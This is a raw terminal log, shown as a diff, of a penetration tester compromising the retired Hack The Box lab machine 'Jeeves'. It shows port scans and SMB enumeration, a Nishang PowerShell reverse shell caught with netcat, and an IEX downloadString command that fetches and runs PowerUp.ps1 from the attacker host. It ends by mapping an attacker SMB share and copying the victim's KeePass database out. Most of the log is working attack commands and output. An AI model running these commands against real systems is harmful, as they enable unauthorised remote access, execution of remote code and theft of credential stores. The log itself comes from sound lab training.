@@ -1,0 +1,655 @@
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ mkdir nmap                                                     
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ nmap -sC -sV -oA nmap/initial 10.10.10.63                      
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 16:22 CDT                                                   
+Nmap scan report for 10.10.10.63                         
+Host is up (0.044s latency).                             
+All 1000 scanned ports on 10.10.10.63 are closed (526) or filtered (474)                                          
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
+Nmap done: 1 IP address (1 host up) scanned in 97.44 seconds                                                      
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ nmap -sC -sV -oA nmap/initial 10.10.10.63                      
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 16:24 CDT                                                   
+Nmap scan report for 10.10.10.63                         
+Host is up (0.059s latency).                             
+Not shown: 997 filtered ports                            
+PORT      STATE SERVICE      VERSION                     
+135/tcp   open  msrpc        Microsoft Windows RPC       
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                         
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT        
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)              
+|_http-title: Error 404 Not Found                        
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows                                            
+
+Host script results:        
+|_clock-skew: mean: 5h01m48s, deviation: 0s, median: 5h01m47s                                                     
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)                                              
+| smb-security-mode:        
+|   authentication_level: user                           
+|   challenge_response: supported                        
+|_  message_signing: disabled (dangerous, but default)   
+| smb2-security-mode:       
+|   2.02:                   
+|_    Message signing enabled but not required           
+| smb2-time:                
+|   date: 2020-05-16T02:26:32                            
+|_  start_date: 2020-05-16T02:24:24                      
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
+Nmap done: 1 IP address (1 host up) scanned in 67.38 seconds                                                      
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ sudo nmap -T4 -p- nmap/allports 10.10.10.63                    
+[sudo] password for arjun:  
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 16:26 CDT                                                   
+Unable to split netmask from target expression: "nmap/allports"                                                   
+
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ sudo nmap -T4 -p- -oA nmap/allports 10.10.10.63                
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 16:26 CDT                                                   
+Nmap scan report for 10.10.10.63                         
+Host is up (0.044s latency).                             
+Not shown: 65531 filtered ports                          
+PORT      STATE SERVICE     
+80/tcp    open  http        
+135/tcp   open  msrpc       
+445/tcp   open  microsoft-ds                             
+50000/tcp open  ibm-db2     
+
+Nmap done: 1 IP address (1 host up) scanned in 148.65 seconds                                                     
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ /opt/ 
+.cisco/         droopescan/     kingsoft/       microsoft/      shell/          zoom/                             
+cisco/          gobuster/       libreoffice6.2/ odat/           Signal/                                           
+containerd/     gradle/         linux_privesc/  resolve/        win_privesc/                                      
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum  
+enum4linux  enumiax         
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum  
+enum4linux  enumiax         
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum4linux --help                                              
+./enum4linux.pl version [unknown] calling Getopt::Std::getopts (version 1.12 [paranoid]),                         
+running under Perl version 5.30.0.                       
+
+Usage: enum4linux.pl [-OPTIONS [-MORE_OPTIONS]] [--] [PROGRAM_ARG1 ...]                                           
+
+The following single-character options are accepted:     
+        With arguments: -u -p -f -R -s -k -w -K          
+        Boolean (without arguments): -U -M -N -S -P -G -l -L -D -d -r -v -o -h -n -a -i -P                        
+
+Options may be merged together.  -- stops processing of options.                                                  
+Space is not required between options and their arguments.                                                        
+  [Now continuing due to backward compatibility and excessive paranoia.                                           
+   See 'perldoc Getopt::Std' about $Getopt::Std::STANDARD_HELP_VERSION.]                                          
+enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)                                          
+Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)                                                        
+
+Simple wrapper around the tools in the samba package to provide similar                                           
+functionality to enum.exe (formerly from www.bindview.com).  Some additional                                      
+features such as RID cycling have also been added for convenience.                                                
+
+Usage: ./enum4linux.pl [options] ip                      
+
+Options are (like "enum"):  
+    -U        get userlist  
+    -M        get machine list*                          
+    -S        get sharelist 
+    -P        get password policy information            
+    -G        get group and member list                  
+    -d        be detailed, applies to -U and -S          
+    -u user   specify username to use (default "")       
+    -p pass   specify password to use (default "")       
+
+The following options from enum.exe aren't implemented: -L, -N, -D, -f                                            
+
+Additional options:         
+    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).                                                
+              This opion is enabled if you don't provide any other options.                                       
+    -h        Display this help message and exit         
+    -r        enumerate users via RID cycling            
+    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)                                    
+    -K n      Keep searching RIDs until n consective RIDs don't correspond to                                     
+              a username.  Impies RID range ends at 999999. Useful                                                
+              against DCs.  
+    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)                                             
+    -s file   brute force guessing for share names       
+    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none) 
+              Used to get sid with "lookupsid known_username"                                                     
+              Use commas to try several users: "-k admin,user1,user2"                                             
+    -o        Get OS information                         
+    -i        Get printer information                    
+    -w wrkg   Specify workgroup manually (usually found automatically)                                            
+    -n        Do an nmblookup (similar to nbtstat)       
+    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)                                      
+
+RID cycling should extract a list of users from Windows (or Samba) hosts                                          
+which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network                                          
+access: Allow anonymous SID/Name translation" enabled (XP, 2003).                                                 
+
+NB: Samba servers often seem to have RIDs in the range 3000-3050.                                                 
+
+Dependancy info: You will need to have the samba package installed as this                                        
+script is basically just a wrapper around rpcclient, net, nmblookup and                                           
+smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/                                        
+is required to get Password Policy info.                 
+
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum4linux -a 10.10.10.63                                      
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 15 16:36:33 2020   
+
+ ==========================                              
+|    Target Information    |                             
+ ==========================                              
+Target ........... 10.10.10.63                           
+RID Range ........ 500-550,1000-1050                     
+Username ......... ''       
+Password ......... ''       
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none                                   
+
+
+ ===================================================     
+|    Enumerating Workgroup/Domain on 10.10.10.63    |    
+ ===================================================     
+[E] Can't find workgroup/domain                          
+
+
+ ===========================================             
+|    Nbtstat Information for 10.10.10.63    |            
+ ===========================================             
+Looking up status of 10.10.10.63                         
+No reply from 10.10.10.63   
+
+ ====================================                    
+|    Session Check on 10.10.10.63    |                   
+ ====================================                    
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.          
+[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                    
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum4linux -a -U jeeves 10.10.10.63                            
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 15 16:37:09 2020   
+
+ ==========================                              
+|    Target Information    |                             
+ ==========================                              
+Target ........... jeeves   
+RID Range ........ 500-550,1000-1050                     
+Username ......... ''       
+Password ......... ''       
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none                                   
+
+
+ ==============================================          
+|    Enumerating Workgroup/Domain on jeeves    |         
+ ==============================================          
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum4linux -a -u jeeves10.10.10.63                             
+enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)                                          
+Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)                                                        
+
+Simple wrapper around the tools in the samba package to provide similar                                           
+functionality to enum.exe (formerly from www.bindview.com).  Some additional                                      
+features such as RID cycling have also been added for convenience.                                                
+
+Usage: ./enum4linux.pl [options] ip                      
+
+Options are (like "enum"):  
+    -U        get userlist  
+    -M        get machine list*                          
+    -S        get sharelist 
+    -P        get password policy information            
+    -G        get group and member list                  
+    -d        be detailed, applies to -U and -S          
+    -u user   specify username to use (default "")       
+    -p pass   specify password to use (default "")       
+
+The following options from enum.exe aren't implemented: -L, -N, -D, -f                                            
+
+Additional options:         
+    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).                                                
+              This opion is enabled if you don't provide any other options.                                       
+    -h        Display this help message and exit         
+    -r        enumerate users via RID cycling            
+    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)                                    
+    -K n      Keep searching RIDs until n consective RIDs don't correspond to                                     
+              a username.  Impies RID range ends at 999999. Useful                                                
+              against DCs.  
+    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)                                             
+    -s file   brute force guessing for share names       
+    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none) 
+              Used to get sid with "lookupsid known_username"                                                     
+              Use commas to try several users: "-k admin,user1,user2"                                             
+    -o        Get OS information                         
+    -i        Get printer information                    
+    -w wrkg   Specify workgroup manually (usually found automatically)                                            
+    -n        Do an nmblookup (similar to nbtstat)       
+    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)                                      
+
+RID cycling should extract a list of users from Windows (or Samba) hosts                                          
+which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network                                          
+access: Allow anonymous SID/Name translation" enabled (XP, 2003).                                                 
+
+NB: Samba servers often seem to have RIDs in the range 3000-3050.                                                 
+
+Dependancy info: You will need to have the samba package installed as this                                        
+script is basically just a wrapper around rpcclient, net, nmblookup and                                           
+smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/                                        
+is required to get Password Policy info.                 
+
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum4linux -a -u jeeves 10.10.10.63                            
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 15 16:37:45 2020   
+
+ ==========================                              
+|    Target Information    |                             
+ ==========================                              
+Target ........... 10.10.10.63                           
+RID Range ........ 500-550,1000-1050                     
+Username ......... 'jeeves' 
+Password ......... ''       
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none                                   
+
+
+ ===================================================     
+|    Enumerating Workgroup/Domain on 10.10.10.63    |    
+ ===================================================     
+[E] Can't find workgroup/domain                          
+
+
+ ===========================================             
+|    Nbtstat Information for 10.10.10.63    |            
+ ===========================================             
+Looking up status of 10.10.10.63                         
+No reply from 10.10.10.63   
+
+ ====================================                    
+|    Session Check on 10.10.10.63    |                   
+ ====================================                    
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.          
+[E] Server doesn't allow session using username 'jeeves', password ''.  Aborting remainder of tests.              
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ enum4linux -a -u jeeves -p admin 10.10.10.63                   
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 15 16:38:17 2020   
+
+ ==========================                              
+|    Target Information    |                             
+ ==========================                              
+Target ........... 10.10.10.63                           
+RID Range ........ 500-550,1000-1050                     
+Username ......... 'jeeves' 
+Password ......... 'admin'  
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none                                   
+
+
+ ===================================================     
+|    Enumerating Workgroup/Domain on 10.10.10.63    |    
+ ===================================================     
+[E] Can't find workgroup/domain                          
+
+
+ ===========================================             
+|    Nbtstat Information for 10.10.10.63    |            
+ ===========================================             
+Looking up status of 10.10.10.63                         
+No reply from 10.10.10.63   
+
+ ====================================                    
+|    Session Check on 10.10.10.63    |                   
+ ====================================                    
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.          
+[E] Server doesn't allow session using username 'jeeves', password 'admin'.  Aborting remainder of tests.         
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ searchsploit jetty                                             
+------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                           |  Path                                  
+                                                                         | (/usr/share/exploitdb/)                
+------------------------------------------------------------------------- ----------------------------------------
+Jetty 3.1.6/3.1.7/4.1 Servlet Engine - Arbitrary Command Execution       | exploits/cgi/webapps/21895.txt         
+Jetty 4.1 Servlet Engine - Cross-Site Scripting                          | exploits/jsp/webapps/21875.txt         
+Jetty 6.1.x - JSP Snoop Page Multiple Cross-Site Scripting Vulnerabiliti | exploits/jsp/webapps/33564.txt         
+Jetty Web Server - Directory Traversal                                   | exploits/windows/remote/36318.txt      
+Mortbay Jetty 7.0.0-pre5 Dispatcher Servlet - Denial of Service          | exploits/multiple/dos/8646.php         
+jetty 6.x < 7.x - Cross-Site Scripting / Information Disclosure / Inject | exploits/jsp/webapps/9887.txt          
+------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result       
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep askjeeves                                                                                                       
+askjeeves                   
+askjeeveslogo               
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ vim /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx
+t                           
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ cp /opt/shell/                                                 
+php/        powershell/ python/     setuid.c             
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ cp /opt/shell/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1                                                                                                              
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ vim shell.ps1                                                  
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ nc -lvnp 9001                                                  
+listening on [any] 9001 ... 
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ ip a  
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                       
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                         
+    inet 127.0.0.1/8 scope host lo                       
+       valid_lft forever preferred_lft forever           
+    inet6 ::1/128 scope host                             
+       valid_lft forever preferred_lft forever           
+2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000         
+    link/ether 2c:4d:54:27:8d:82 brd ff:ff:ff:ff:ff:ff   
+3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000               
+    link/ether d0:57:7b:8c:5b:9a brd ff:ff:ff:ff:ff:ff   
+    inet 100.64.9.228/20 brd 100.64.15.255 scope global dynamic noprefixroute wlan0                               
+       valid_lft 6453sec preferred_lft 6453sec           
+    inet6 fe80::a673:a3db:78c5:f405/64 scope link noprefixroute                                                   
+       valid_lft forever preferred_lft forever           
+5: vmnet1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000      
+    link/ether 00:50:56:c0:00:01 brd ff:ff:ff:ff:ff:ff   
+    inet 172.16.192.1/24 brd 172.16.192.255 scope global vmnet1                                                   
+       valid_lft forever preferred_lft forever           
+    inet6 fe80::250:56ff:fec0:1/64 scope link            
+       valid_lft forever preferred_lft forever           
+6: vmnet8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000      
+    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff   
+    inet 192.168.211.1/24 brd 192.168.211.255 scope global vmnet8                                                 
+       valid_lft forever preferred_lft forever           
+    inet6 fe80::250:56ff:fec0:8/64 scope link            
+       valid_lft forever preferred_lft forever           
+7: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 
+    link/none               
+    inet 10.10.14.18/23 brd 10.10.15.255 scope global tun0                                                        
+       valid_lft forever preferred_lft forever           
+    inet6 dead:beef:2::1010/64 scope global              
+       valid_lft forever preferred_lft forever           
+    inet6 fe80::f3ac:b9c6:6630:3e92/64 scope link stable-privacy                                                  
+       valid_lft forever preferred_lft forever           
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ vim shell.ps1                                                  
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ nc -lvnp 9001                                                  
+listening on [any] 9001 ... 
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ vim shell.ps1                                                  
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$ nc -lvnp 9001                                                  
+listening on [any] 9001 ... 
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.63] 49677                                                       
+Windows PowerShell running as user kohsuke on JEEVES     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\Administrator\.jenkins>dir                   
+
+
+    Directory: C:\Users\Administrator\.jenkins           
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                      
+----                -------------         ------ ----                                                                                                                                                                                      
+d-----        11/3/2017  10:33 PM                jobs                                                                                                                                                                                      
+d-----        11/3/2017  10:33 PM                logs                                                                                                                                                                                      
+d-----        11/3/2017  10:33 PM                nodes                                                                                                                                                                                     
+d-----        11/3/2017  10:44 PM                plugins                                                                                                                                                                                   
+d-----       12/24/2017   2:47 AM                secrets                                                                                                                                                                                   
+d-----        11/8/2017   8:52 AM                updates                                                                                                                                                                                   
+d-----        11/3/2017  10:33 PM                userContent                                                                                                                                                                               
+d-----        11/3/2017  10:33 PM                users                                                                                                                                                                                     
+d-----        11/3/2017  10:47 PM                war                                                                                                                                                                                       
+d-----        11/3/2017  10:43 PM                workflow-libs                                                                                                                                                                             
+-a----        11/8/2017   4:45 PM             48 .owner                                                                                                                                                                                    
+-a----        5/15/2020  10:25 PM           1684 config.xml                                                                                                                                                                                
+-a----        5/15/2020  10:25 PM            156 hudson.model.UpdateCenter.xml                                                                                                                                                             
+-a----        11/3/2017  10:43 PM            374 hudson.plugins.git.GitTool.xml                                                                                                                                                            
+-a----        11/3/2017  10:33 PM           1712 identity.key.enc                                                                                                                                                                          
+-a----        11/3/2017  10:46 PM             94 jenkins.CLI.xml                                                                                                                                                                           
+              5/15/2020  10:26 PM          75707 jenkins.err.log                                                                                                                                                                           
+-a----        11/3/2017  10:47 PM         360448 jenkins.exe                                                                                                                                                                               
+-a----        11/3/2017  10:47 PM            331 jenkins.exe.config                                                                                                                                                                        
+-a----        5/15/2020  10:25 PM              4 jenkins.install.InstallUtil.lastExecVersion                                                                                                                                               
+-a----        11/3/2017  10:45 PM              4 jenkins.install.UpgradeWizard.state                                                                                                                                                       
+-a----        11/3/2017  10:46 PM            138 jenkins.model.DownloadSettings.xml                                                                                                                                                        
+             12/24/2017   2:38 PM           2688 jenkins.out.log                                                                                                                                                                           
+-a----        5/15/2020  10:24 PM              4 jenkins.pid                                                                                                                                                                               
+-a----        11/3/2017  10:46 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml                                                                                                                                  
+-a----        11/3/2017  10:46 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                                                                                                                                      
+-a----        11/3/2017  10:47 PM       74271222 jenkins.war                                                                                                                                                                               
+-a----        5/15/2020  10:24 PM          34147 jenkins.wrapper.log                                                                                                                                                                       
+-a----        11/3/2017  10:49 PM           2881 jenkins.xml                                                                                                                                                                               
+-a----        5/15/2020  10:25 PM            907 nodeMonitors.xml                                                                                                                                                                          
+-a----        11/3/2017  10:47 PM            129 queue.xml.bak                                                                                                                                                                             
+-a----        11/3/2017  10:33 PM             64 secret.key                                                                                                                                                                                
+-a----        11/3/2017  10:33 PM              0 secret.key.not-so-secret                                                                                                                                                                  
+
+
+PS C:\Users\Administrator\.jenkins> cd ..                
+PS C:\Users\Administrator> dir                           
+PS C:\Users\Administrator> dir : Access to the path 'C:\Users\Administrator' is denied.                           
+At line:1 char:1            
++ dir                       
++ ~~~                       
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessExc                                                                                                                     
+   eption                   
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand        
+                            
+
+PS C:\Users\Administrator> cd ..                         
+PS C:\Users> dir            
+
+
+    Directory: C:\Users     
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                      
+----                -------------         ------ ----                                                                                                                                                                                      
+d-----        11/3/2017  11:07 PM                Administrator                                                                                                                                                                             
+d-----        11/5/2017   9:17 PM                DefaultAppPool                                                                                                                                                                            
+d-----        11/3/2017  11:19 PM                kohsuke                                                                                                                                                                                   
+d-r---       10/25/2017   4:46 PM                Public                                                                                                                                                                                    
+
+
+PS C:\Users> cd kohsuke     
+PS C:\Users\kohsuke> dir    
+
+
+    Directory: C:\Users\kohsuke                          
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                      
+----                -------------         ------ ----                                                                                                                                                                                      
+d-----        11/3/2017  10:51 PM                .groovy                                                                                                                                                                                   
+d-r---        11/3/2017  11:15 PM                Contacts                                                                                                                                                                                  
+d-r---        11/3/2017  11:19 PM                Desktop                                                                                                                                                                                   
+d-r---        11/3/2017  11:18 PM                Documents                                                                                                                                                                                 
+d-r---        11/3/2017  11:15 PM                Downloads                                                                                                                                                                                 
+d-r---        11/3/2017  11:15 PM                Favorites                                                                                                                                                                                 
+d-r---        11/3/2017  11:22 PM                Links                                                                                                                                                                                     
+d-r---        11/3/2017  11:15 PM                Music                                                                                                                                                                                     
+d-r---        11/3/2017  11:22 PM                OneDrive                                                                                                                                                                                  
+d-r---        11/4/2017   3:10 AM                Pictures                                                                                                                                                                                  
+d-r---        11/3/2017  11:15 PM                Saved Games                                                                                                                                                                               
+d-r---        11/3/2017  11:16 PM                Searches                                                                                                                                                                                  
+d-r---        11/3/2017  11:15 PM                Videos                                                                                                                                                                                    
+
+
+PS C:\Users\kohsuke> cd Desktop                          
+PS C:\Users\kohsuke\Desktop> dir                         
+
+
+    Directory: C:\Users\kohsuke\Desktop                  
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                      
+----                -------------         ------ ----                                                                                                                                                                                      
+-ar---        11/3/2017  11:22 PM             32 user.txt                                                                                                                                                                                  
+
+
+PS C:\Users\kohsuke\Desktop> type user.txt               
+e3232272596fb47950d59c4cf1e7066a                         
+PS C:\Users\kohsuke\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/PowerUp.ps1')  
+^[[1;5                      
+[*] Running Invoke-AllChecks                             
+
+
+[*] Checking if user is in a local group with administrative privileges...                                        
+
+
+[*] Checking for unquoted service paths...               
+
+
+[*] Checking service executable and argument permissions...                                                       
+
+
+ServiceName                     : jenkins                
+Path                            : "C:\Users\Administrator\.jenkins\jenkins.exe"                                   
+ModifiableFile                  : C:\Users\Administrator\.jenkins\jenkins.exe                                     
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}                           
+ModifiableFileIdentityReference : JEEVES\kohsuke         
+StartName                       : .\kohsuke              
+AbuseFunction                   : Install-ServiceBinary -Name 'jenkins'                                           
+CanRestart                      : False                  
+
+
+
+
+
+[*] Checking service permissions...                      
+
+
+[*] Checking %PATH% for potentially hijackable DLL locations...                                                   
+
+
+[*] Checking for AlwaysInstallElevated registry key...   
+
+
+[*] Checking for Autologon credentials in registry...    
+
+
+[*] Checking for modifidable registry autoruns and configs...                                                     
+
+
+[*] Checking for modifiable schtask files/configs...     
+
+
+[*] Checking for unattended install files...             
+
+
+UnattendPath : C:\Windows\Panther\Unattend.xml           
+
+
+
+
+
+[*] Checking for encrypted web.config strings...         
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...                                    
+
+
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....                                             
+
+
+
+
+[*] Checking for cached Group Policy Preferences .xml files....                                                   
+
+
+PS C:\Users\kohsuke\Desktop> Get-ChildItem : Access to the path 'C:\ProgramData\VMware\VMware Tools\GuestProxyData\trusted' is denied.                                                                                                     
+At line:3707 char:21        
++ ... $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.x ...                                   
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                       
+    + CategoryInfo          : PermissionDenied: (C:\ProgramData\...oxyData\trusted:String) [Get-ChildItem], Unauthoriz                                                                                                                     
+   edAccessException        
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand        
+                            
+                            
+PS C:\Users\kohsuke\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/PowerUp.ps1')  
+PS C:\Users\kohsuke\Desktop>                             
+PS C:\Users\kohsuke\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/PowerUp.ps1')  
+PS C:\Users\kohsuke\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/PowerUp.ps1')  
+
+[*] Running Invoke-AllChecks                             
+
+
+[*] Checking if user is in a local group with administrative privileges...                                        
+
+
+[*] Checking for unquoted service paths...               
+
+
+[*] Checking service executable and argument permissions...                                                       
+
+
+[*] Checking service permissions...                      
+
+
+[*] Checking %PATH% for potentially hijackable .dll locations...                                                  
+
+
+[*] Checking for AlwaysInstallElevated registry key...   
+
+
+[*] Checking for Autologon credentials in registry...    
+
+
+[*] Checking for vulnerable registry autoruns and configs...                                                      
+
+
+[*] Checking for vulnerable schtask files/configs...     
+
+
+[*] Checking for unattended install files...             
+
+
+UnattendPath : C:\Windows\Panther\Unattend.xml           
+
+
+
+
+
+[*] Checking for encrypted web.config strings...         
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...                                    
+
+
+PS C:\Users\kohsuke\Desktop> Get-ChildItem : Cannot find drive. A drive with the name 'Description' does not exist.  
+At line:1845 char:28        
++ ...      $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEa ...                                   
++                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                               
+    + CategoryInfo          : ObjectNotFound: (Description:String) [Get-ChildItem], DriveNotFoundException        
+    + FullyQualifiedErrorId : DriveNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand                     
+                            
+
+PS C:\Users\kohsuke\Desktop> cd ..                       
+PS C:\Users\kohsuke> cd Documents                        
+PS C:\Users\kohsuke\Documents> dir                       
+
+
+    Directory: C:\Users\kohsuke\Documents                
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                      
+----                -------------         ------ ----                                                                                                                                                                                      
+-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                                                                                                                                                  
+
+
+PS C:\Users\kohsuke\Documents> use Z: \\10.10.14.18\transfer                                                      
+
+
+    Directory: C:\Users\kohsuke\Documents                
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                      
+----                -------------         ------ ----                                                                                                                                                                                      
+-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                                                                                                                                                  
+
+
+PS C:\Users\kohsuke\Documents> Invoke-PowerShellTcp : The term 'use' is not recognized as the name of a cmdlet, function, script file, or operable                                                                                         
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:127 char:1          
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 9001                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException                                
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp              
+                            
+
+PS C:\Users\kohsuke\Documents> use \\10.10.14.18\transfer Z:                                                      
+PS C:\Users\kohsuke\Documents> Invoke-PowerShellTcp : The term 'use' is not recognized as the name of a cmdlet, function, script file, or operable                                                                                         
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:127 char:1          
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 9001                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException                                
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp              
+                            
+
+PS C:\Users\kohsuke\Documents> New-PSDrive -Name "WTF" -PSProvider "FileSystem" -Root "\\10.10.14.18\transfer"    
+
+Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation                                                                                                                    
+----           ---------     --------- --------      ----                                               ---------------                                                                                                                    
+WTF                                    FileSystem    \\10.10.14.18\transfer                                                                                                                                                                
+
+
+PS C:\Users\kohsuke\Documents> cp CEH.kdbx WTF:          
+PS C:\Users\kohsuke\Documents> ^C                        
+arjun@broly:~/Documents/HacktheBox/retired/jeeves$        
